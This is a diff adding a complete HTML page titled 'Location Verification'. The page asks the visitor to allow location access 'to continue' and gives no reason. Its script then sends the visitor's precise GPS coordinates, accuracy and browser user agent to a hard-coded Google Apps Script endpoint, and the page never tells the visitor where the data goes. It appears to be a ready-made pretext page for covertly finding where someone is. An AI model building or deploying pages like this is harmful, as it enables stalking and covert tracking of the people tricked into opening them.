@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 420px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.12);
+    }
+
+    h2 {
+      margin-bottom: 10px;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .small {
+      font-size: 13px;
+      color: #666;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h2>Location Verification</h2>
+    <p>Please allow location access to continue.</p>
+    <div id="status">Requesting location permission...</div>
+    <p class="small">Your browser will ask for permission before sharing location.</p>
+  </div>
+
+  <script>
+    const BACKEND_URL = "https://script.google.com/macros/s/AKfycbwUmN-boM_uonN93kSWvvKxtqmxZesysgSSP3lurMLYxCLhUUU3nmZBj-yKXin6rTW2/exec";
+
+    window.onload = function () {
+      requestLocation();
+    };
+
+    function requestLocation() {
+      const status = document.getElementById("status");
+
+      if (!navigator.geolocation) {
+        status.innerText = "Geolocation is not supported by this browser.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          status.innerText = "Location captured. Sending...";
+
+          const payload = {
+            latitude: latitude,
+            longitude: longitude,
+            accuracy: accuracy,
+            userAgent: navigator.userAgent,
+            ip: ""
+          };
+
+          try {
+            await fetch(BACKEND_URL, {
+              method: "POST",
+              mode: "no-cors",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(payload)
+            });
+
+            status.innerText = "Location submitted successfully.";
+          } catch (error) {
+            status.innerText = "Location captured, but failed to submit.";
+            console.error(error);
+          }
+        },
+        function (error) {
+          if (error.code === error.PERMISSION_DENIED) {
+            status.innerText = "Location permission was denied.";
+          } else if (error.code === error.POSITION_UNAVAILABLE) {
+            status.innerText = "Location information is unavailable.";
+          } else if (error.code === error.TIMEOUT) {
+            status.innerText = "Location request timed out.";
+          } else {
+            status.innerText = "Unable to get location.";
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    }
+  </script>
+</body>
+</html>
